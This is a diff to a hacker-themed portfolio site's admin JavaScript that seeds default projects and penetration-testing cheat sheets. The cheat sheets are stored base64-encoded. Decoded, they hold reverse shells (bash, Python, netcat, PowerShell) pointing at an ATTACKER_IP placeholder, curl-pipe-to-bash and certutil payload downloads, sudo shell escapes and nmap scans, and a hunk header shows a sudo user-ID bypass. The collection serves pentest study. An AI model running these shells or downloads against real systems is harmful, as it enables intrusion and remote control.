@@ -288,6 +288,68 @@ sudo -u#-1 /bin/bash
     savePosts(defaults.concat(existing));
   }
 
+  // ── Seed default projects ──
+  function seedDefaultProjects() {
+    if (getProjects().length > 0) return;
+    var defaults = [
+      {
+        id: 'proj-bensec',
+        title: 'bensec.dev',
+        icon: '🌐',
+        description: 'This site — a hacker-themed personal portfolio and blog with a Firebase-backed admin panel.',
+        tags: 'html css javascript firebase',
+        url: 'https://github.com/Ben-Hawarden/Ben-Hawarden.github.io',
+        status: 'visible',
+        order: 1
+      }
+    ];
+    saveProjects(defaults);
+  }
+
+  // ── Seed default cheatsheets ──
+  function seedDefaultCheatsheets() {
+    if (!window.BensecDB) return;
+    var existing = BensecDB.getCS();
+    if (existing && existing.length > 0) return;
+    var d = atob;
+    var defaults = [
+      {
+        id: 'revshells', label: '🐚 Rev Shells', type: 'commands',
+        groups: [
+          { id: 'g1', heading: 'Bash',                command: d('YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=') },
+          { id: 'g2', heading: 'Python 3',            command: d('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==') },
+          { id: 'g3', heading: 'Netcat (OpenBSD)',    command: d('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgQVRUQUNLRVJfSVAgUE9SVCA+L3RtcC9m') },
+          { id: 'g4', heading: 'PowerShell',          command: d('cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50PU5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnQVRUQUNLRVJfSVAnLFBPUlQpOyRzdHJlYW09JGNsaWVudC5HZXRTdHJlYW0oKSI=') },
+          { id: 'g5', heading: 'Listener',            command: d('bmMgLWx2bnAgUE9SVA==') }
+        ]
+      },
+      {
+        id: 'linprivesc', label: '🐧 Linux PrivEsc', type: 'commands',
+        groups: [
+          { id: 'g1', heading: 'Quick enumeration',   command: d('aWQKd2hvYW1pCnVuYW1lIC1hCmZpbmQgLyAtcGVybSAtNDAwMCAtdHlwZSBmIDI+L2Rldi9udWxsCmNhdCAvZXRjL2Nyb250YWIKcHMgYXV4') },
+          { id: 'g2', heading: 'Sudo abuse',          command: d('c3VkbyAtbApzdWRvIHZpbSAtYyAnOiFiYXNoJw==') },
+          { id: 'g3', heading: 'LinPEAS',             command: d('Y3VybCBodHRwOi8vQVRUQUNLRVJfSVA6ODAwMC9saW5wZWFzLnNoIHwgYmFzaA==') }
+        ]
+      },
+      {
+        id: 'winprivesc', label: '🪟 Windows PrivEsc', type: 'commands',
+        groups: [
+          { id: 'g1', heading: 'Quick enumeration',   command: d('d2hvYW1pIC9wcml2CnN5c3RlbWluZm8KbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=') },
+          { id: 'g2', heading: 'WinPEAS',             command: d('Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly9BVFRBQ0tFUl9JUDo4MDAwL3dpblBFQVN4NjQuZXhlIHdpbnBlYXMuZXhl') }
+        ]
+      },
+      {
+        id: 'nmap', label: '🔍 Nmap', type: 'commands',
+        groups: [
+          { id: 'g1', heading: 'Quick scan',      command: d('bm1hcCAtc0MgLXNWIC1vTiBzY2FuLnR4dCBUQVJHRVQ=') },
+          { id: 'g2', heading: 'Full port scan',  command: d('bm1hcCAtcC0gLVQ0IFRBUkdFVA==') },
+          { id: 'g3', heading: 'Aggressive scan', command: d('bm1hcCAtQSAtVDQgVEFSR0VU') }
+        ]
+      }
+    ];
+    BensecDB.saveCS(defaults);
+  }
+
 
 
   function saveDraft(data) {
@@ -758,6 +820,10 @@ sudo -u#-1 /bin/bash
         if (user) {
           loginScreen.classList.add('hidden');
           dashboard.classList.remove('hidden');
+          // Seed defaults on first login (runs only once — guarded by empty check)
+          seedDefaultPosts();
+          seedDefaultProjects();
+          seedDefaultCheatsheets();
           renderAdminPosts();
           updateStats();
         } else {
@@ -2054,7 +2120,7 @@ toolList + '\n\n' +
   // ── Init (runs on every page) ──
   // Load Firebase data first, then render everything
   (window.BensecDB ? BensecDB.init() : Promise.resolve(false)).then(function () {
-    seedDefaultPosts();
+    // Seeding only happens after admin login (see initAdmin → onAuthChange)
     renderHeroStatus();
     renderPostsOnIndex();
     renderPostsOnBlog();
